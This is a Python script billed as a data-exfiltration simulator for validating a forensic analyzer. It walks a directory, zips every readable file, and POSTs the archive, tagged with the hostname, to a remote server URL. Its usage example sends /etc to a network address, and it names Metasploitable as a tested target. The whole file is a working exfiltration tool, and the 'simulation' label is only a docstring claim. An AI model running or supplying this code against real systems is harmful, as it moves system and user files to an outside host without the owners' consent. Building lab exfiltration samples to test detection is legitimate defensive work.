#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
data_exfil_simulator.py - Simulate data exfiltration: zip a directory and send it to a remote server.
Compatible with Python 2.4, 2.5, 2.6, 2.7 and Python 3.x.
Tested on legacy targets (e.g. Metasploitable 2 / Ubuntu 8.04) and modern systems.

This is a SIMULATION tool for isolated test environments only.
It exercises the collect-zip-exfiltrate pattern so the forensic
analyzer can be validated against realistic exfil artifacts.
"""

import os
import sys
import tempfile
import socket
import zipfile
import shutil

# Cross-version urllib import (Python 2 vs Python 3)
try:
    import urllib.request as urllib2
except ImportError:
    import urllib2

# Compression mode fallback (zlib optional)
try:
    import zlib
    COMPRESSION = zipfile.ZIP_DEFLATED
except ImportError:
    COMPRESSION = zipfile.ZIP_STORED


def create_zip_archive(target_dir, output_zip_path):
    """Recursively archive target_dir into output_zip_path without shutil.make_archive or os.path.relpath."""
    target_dir = os.path.abspath(target_dir)
    zf = zipfile.ZipFile(output_zip_path, 'w', COMPRESSION)
    try:
        for root, dirs, files in os.walk(target_dir):
            for filename in files:
                filepath = os.path.join(root, filename)
                # Compute relative path safely across Python 2.4 - 3.x
                if filepath.startswith(target_dir):
                    rel_path = filepath[len(target_dir):].lstrip('/\\')
                else:
                    rel_path = filename

                try:
                    zf.write(filepath, rel_path)
                except Exception:
                    err = sys.exc_info()[1]
                    # Print warning for inaccessible files (e.g. permission denied) and continue
                    print("[-] Warning: Skipping %s (%s)" % (filepath, err))
    finally:
        zf.close()


def pack_and_send(target_dir, server_url):
    if not os.path.exists(target_dir):
        print("[-] Error: Target directory '%s' does not exist." % (target_dir,))
        return False

    print("[*] Packing directory: %s" % (target_dir,))

    temp_dir = tempfile.mkdtemp()
    archive_path = os.path.join(temp_dir, "evidence.zip")

    try:
        create_zip_archive(target_dir, archive_path)
        print("[+] Successfully packed into %s" % (archive_path,))

        file_size = os.path.getsize(archive_path)
        print("[*] Connecting to %s to send %d bytes..." % (server_url, file_size))

        try:
            hostname = socket.gethostname()
        except Exception:
            hostname = "unknown_host"

        filename = "%s_evidence.zip" % (hostname,)

        # Read archive data in binary mode (compatible with Python 2 & 3)
        f = open(archive_path, 'rb')
        try:
            payload = f.read()
        finally:
            f.close()

        headers = {
            'Content-Type': 'application/zip',
            'Content-Length': str(len(payload)),
            'X-Filename': filename
        }

        # urllib2.Request(url, data, headers) sends a POST request in both Python 2 and 3
        req = urllib2.Request(server_url, payload, headers)

        try:
            response = urllib2.urlopen(req)
            try:
                if hasattr(response, 'getcode'):
                    status_code = response.getcode()
                else:
                    status_code = getattr(response, 'code', 200)

                resp_body = response.read()
                if hasattr(resp_body, 'decode'):
                    resp_body = resp_body.decode('utf-8', 'replace')

                if status_code == 200:
                    print("[+] Successfully sent evidence to central server. Server says: %s" % (resp_body.strip(),))
                    return True
                else:
                    print("[-] Failed to send. Server returned status %s: %s" % (status_code, resp_body))
                    return False
            finally:
                response.close()
        except Exception:
            err = sys.exc_info()[1]
            print("[-] Error connecting to server: %s" % (err,))
            return False

    finally:
        print("[*] Cleaning up temporary files...")
        if os.path.exists(temp_dir):
            try:
                shutil.rmtree(temp_dir)
            except Exception:
                pass
        print("[*] Done.")


def print_usage():
    print("Usage: python data_exfil_simulator.py <target_dir> <server_url>")
    print("Example: python data_exfil_simulator.py /etc http://192.168.1.10:8000/")
    print("")
    print("Note for Metasploitable / Legacy Linux:")
    print("  Run with 'python' (Python 2.5+), no external dependencies required.")


if __name__ == '__main__':
    if len(sys.argv) < 3:
        if len(sys.argv) == 2 and sys.argv[1] in ('-h', '--help', 'help'):
            print_usage()
            sys.exit(0)
        print("[-] Error: Missing arguments.")
        print_usage()
        sys.exit(1)

    target_dir = sys.argv[1]
    server_url = sys.argv[2]

    pack_and_send(target_dir, server_url)
